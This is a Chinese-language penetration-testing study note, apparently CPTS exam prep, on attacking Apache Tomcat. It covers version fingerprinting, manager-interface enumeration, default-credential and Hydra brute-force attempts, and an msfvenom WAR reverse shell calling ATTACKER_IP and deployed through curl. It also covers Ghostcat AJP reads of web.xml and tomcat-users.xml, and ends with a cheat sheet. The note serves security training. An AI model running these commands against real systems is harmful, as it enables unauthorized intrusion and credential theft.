# 第 54A 章 - Tomcat 探索與枚舉

## 標籤

- #cpts
- #chapter
- #services
- #tomcat
- #java

## 學習目標

- 能快速辨識 Apache Tomcat 實例與其版本。
- 能枚舉 /manager 與 /host-manager 管理介面。
- 理解 WAR 部署的 RCE 路徑與 AJP/Ghostcat 風險。
- 能從 webapps 結構與 WEB-INF/web.xml 理解應用路由。
- 建立從版本辨識到 RCE 的完整測試流程。

---

## 理論基礎

```text
Apache Tomcat：
  Port: 8080/tcp（HTTP）、8443/tcp（HTTPS）、8009/tcp（AJP）
        也可能在 80 / 8180 / 443
  用途：Java Servlet / JSP 應用伺服器

高價值攻擊面：
  1. /manager/html → WAR 部署 → 上傳惡意 WAR → RCE
  2. /host-manager → 虛擬主機管理（較少見但同等危險）
  3. AJP（8009）→ CVE-2020-1938 Ghostcat → 任意讀取 webapps 檔案（含 WEB-INF/web.xml）
  4. 弱憑證 → tomcat:tomcat / admin:admin / tomcat:s3cret（預設）
  5. 版本過舊 → 對應 CVE 查詢

常見角色：
  conf/tomcat-users.xml → 使用者帳號與角色定義
  webapps/<app>/WEB-INF/web.xml → 路由與 Servlet 對應
  webapps/<app>/WEB-INF/classes/ → 應用 class 檔
  logs/catalina.out → 應用日誌

AJP（Apache JServ Protocol）：
  允許 Apache httpd 等前端代理與 Tomcat 後端通訊
  若 8009 對外開放且版本 < 9.0.31 / 8.5.51 → Ghostcat
```

---

## 方法一：服務發現與版本辨識

```bash
# 掃描常見 Tomcat 埠
nmap -sV -p 80,443,8080,8180,8443,8009 TARGET_IP
# 8080 → HTTP，banner 通常顯示 Apache Tomcat
# 8009 → AJP，若對外開放是重要風險線索

# 從 Server header 辨識 Tomcat
curl -s -I http://TARGET_IP:8080/
# Server: Apache-Coyote/1.1 → Tomcat（Coyote 是 Tomcat 的 HTTP connector）
# Server: Apache Tomcat → 較新版本直接顯示

# 從預設 404 頁取得版本（最常見）
curl -s http://TARGET_IP:8080/INVALID_PATH | grep -i tomcat
# 若錯誤頁未被自訂，HTML 中含 Apache Tomcat/X.X.XX

# 從文件頁取得版本（即使錯誤頁被改過）
curl -s http://TARGET_IP:8080/docs/ | grep -i "Apache Tomcat"
# 文件頁幾乎都有版本號碼

# 確認 AJP 是否開放
nmap -sV -p 8009 TARGET_IP
# 8009/tcp open  ajp13  Apache Jserv (Protocol v1.3)
```

---

## 方法二：管理介面枚舉

```bash
# 找高價值路徑（直接嘗試）
for PATH in /docs /examples /manager /manager/html /manager/status \
  /manager/text /host-manager /host-manager/html; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" http://TARGET_IP:8080$PATH)
  echo "$PATH → $CODE"
done
# 200 → 可存取（若是 manager/html 就是大獎）
# 401/403 → 存在但需認證（仍是高價值！）
# 404 → 不存在

# Gobuster 找隱藏路徑（更完整）
gobuster dir -u http://TARGET_IP:8080 \
  -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt \
  -t 30 -b 404
# -b 404 → 忽略 404 回應（減少雜訊）

# 驗證管理面存在（只看狀態碼）
curl -s -o /dev/null -w "%{http_code}" http://TARGET_IP:8080/manager/html
# 401 → 存在且需認證 → 嘗試預設憑證
# 403 → 存在但 IP 限制 → 記錄為高價值，可能需要繞過或內網存取
```

---

## 方法三：預設憑證嘗試

```bash
# 常見預設憑證（依序嘗試）
# tomcat:tomcat
# admin:admin
# admin:password
# tomcat:s3cret
# manager:manager
# admin:tomcat

# curl 嘗試登入 manager/html
curl -s -u "tomcat:tomcat" http://TARGET_IP:8080/manager/html
# 若回傳 HTML 頁面 → 登入成功

curl -s -u "admin:admin" http://TARGET_IP:8080/manager/html -w "\nHTTP_CODE: %{http_code}\n"
# 200 → 成功；401 → 失敗

# Hydra 暴力破解 /manager/html（HTTP Basic Auth）
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/seclists/Passwords/Common-Credentials/tomcat-betterdefaultpasslist.txt \
  TARGET_IP http-get /manager/html
# http-get → HTTP Basic Authentication
# 配合 Tomcat 專用密碼清單效果最好

# 若成功登入，確認可用操作
curl -s -u "tomcat:tomcat" http://TARGET_IP:8080/manager/text/list
# 列出所有已部署的應用程式
```

---

## 方法四：WAR 部署 RCE

```bash
# 前提：有 manager-gui 或 manager-script 角色的憑證

# 方法一：msfvenom 建立惡意 WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war -o shell.war
# -p java/jsp_shell_reverse_tcp → Java JSP reverse shell
# -f war → 輸出格式為 WAR
# -o shell.war → 輸出檔案名稱

# 在攻擊機監聽
nc -lvnp 4444

# 上傳 WAR 到 manager（curl）
curl -v -u "tomcat:tomcat" \
  -T shell.war \
  "http://TARGET_IP:8080/manager/text/deploy?path=/shell&update=true"
# -T → 上傳檔案
# ?path=/shell → 部署路徑（觸發 URL 為 /shell）
# update=true → 若已存在則更新

# 觸發 shell
curl -s http://TARGET_IP:8080/shell/
# → 連線到 nc 監聽的 reverse shell

# 方法二：透過 Web UI 上傳（GUI）
# 登入 /manager/html → 找 "WAR file to deploy" → 選擇 shell.war → Deploy

# 清理（移除 WAR）
curl -s -u "tomcat:tomcat" "http://TARGET_IP:8080/manager/text/undeploy?path=/shell"
```

---

## 方法五：Ghostcat（CVE-2020-1938，AJP 讀取）

```bash
# 前提：8009/tcp 開放 且 Tomcat < 9.0.31 / 8.5.51 / 7.0.100

# 使用 Ghostcat PoC 腳本讀取 webapps 檔案
# 工具：https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi

python3 tomcat_ghostcat.py -a TARGET_IP
# 預設讀取 WEB-INF/web.xml（路由與 Servlet 定義）

# 指定讀取目標檔案
python3 tomcat_ghostcat.py -a TARGET_IP -f /WEB-INF/web.xml
# /WEB-INF/web.xml → 應用路由、Servlet 類別名稱
python3 tomcat_ghostcat.py -a TARGET_IP -f /WEB-INF/classes/com/example/Secret.class
# 讀取 class 檔案（含硬編碼憑證）

# Metasploit 模組
# use auxiliary/admin/http/tomcat_ghostcat
# set RHOSTS TARGET_IP
# set RPORT 8009
# run

# 確認版本是否受影響（先確認再利用）
nmap -sV -p 8009 TARGET_IP
# 對照版本：9.x < 9.0.31、8.x < 8.5.51、7.x < 7.0.100 → 受影響
```

---

## 方法六：應用結構分析

```bash
# 若有 LFI 或 Ghostcat，讀取高價值檔案
# 1. 路由與 Servlet
/WEB-INF/web.xml

# 2. 使用者憑證
/conf/tomcat-users.xml
# 含 username / password / roles → 可能有明文密碼

# 3. 應用設定（常含資料庫憑證）
/WEB-INF/classes/application.properties
/WEB-INF/classes/application.yml
/WEB-INF/classes/config.properties

# 4. 日誌（含錯誤、堆疊、憑證線索）
/logs/catalina.out
/logs/localhost.log

# 直接嘗試（若 Tomcat 設定有目錄列出）
curl -s http://TARGET_IP:8080/APP_NAME/
# 看是否顯示 Index of → 列出應用目錄
```

---

## 決策流程

```
nmap 確認 8080/8443/8009
    ↓
辨識版本（curl /INVALID → 404頁 / curl /docs/ → 文件頁）
    ↓
枚舉高價值路徑（/docs /examples /manager /host-manager）
    ↓
/manager 存在？
  401（需認證）→ 嘗試預設憑證 / hydra 暴力破解
    → 登入成功 → msfvenom WAR → 部署 → 觸發 → RCE
  403（IP 限制）→ 記錄，可能需從內網存取
  404（不存在）→ 繼續其他方向
    ↓
8009 開放？
  → 確認版本 < 9.0.31/8.5.51 → Ghostcat → 讀取 web.xml / tomcat-users.xml
    ↓
讀到憑證或設定 → 進一步提升權限
```

---

## 速查表

```bash
# 版本辨識
curl -s http://TARGET_IP:8080/INVALID | grep -i tomcat
curl -s http://TARGET_IP:8080/docs/ | grep -i "Apache Tomcat"
nmap -sV -p 8080,8009 TARGET_IP

# 高價值路徑
for P in /docs /examples /manager /manager/html /host-manager; do
  echo "$P: $(curl -s -o /dev/null -w '%{http_code}' http://TARGET_IP:8080$P)"
done

# 預設憑證嘗試
curl -s -u "tomcat:tomcat" http://TARGET_IP:8080/manager/html -w "%{http_code}"
curl -s -u "admin:admin" http://TARGET_IP:8080/manager/html -w "%{http_code}"

# WAR 部署 RCE
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war -o shell.war
curl -u "tomcat:tomcat" -T shell.war "http://TARGET_IP:8080/manager/text/deploy?path=/shell&update=true"
curl http://TARGET_IP:8080/shell/    # 觸發 reverse shell

# Ghostcat（AJP LFI）
python3 tomcat_ghostcat.py -a TARGET_IP -f /WEB-INF/web.xml

# 高價值檔案
# /conf/tomcat-users.xml → 憑證
# /WEB-INF/web.xml → 路由
# /WEB-INF/classes/application.properties → 設定
```

---

## 常見錯誤與排查

- 只看 8080 就假設是 Tomcat — 先確認版本（404 頁 / /docs）。
- 看到 401 就放棄 /manager — 401 代表存在！試預設憑證。
- 忽略 AJP（8009） — 若版本舊且 8009 對外，Ghostcat 是直接路徑。
- WAR 上傳後忘記觸發 — 要 curl 部署路徑才會執行。
- 不記錄版本與管理面存在就急著做下一步 — 先蒐證，再行動。

版本不明時依序確認：
1. `curl /INVALID` 404 頁
2. `curl /docs/`
3. `nmap -sV -p 8080`
4. 截圖/原始碼交叉驗證

---

## 關聯筆記

- [[54-其他企業服務|第 54 章 - 其他企業服務]]
- [[../04-Web/35A-應用程式探索與CMS列舉|第 35A 章 - 應用程式探索與 CMS 列舉]]
- [[../01-Information-Gathering/20-Nmap服務與版本偵測|第 20 章 - Nmap 服務與版本偵測]]
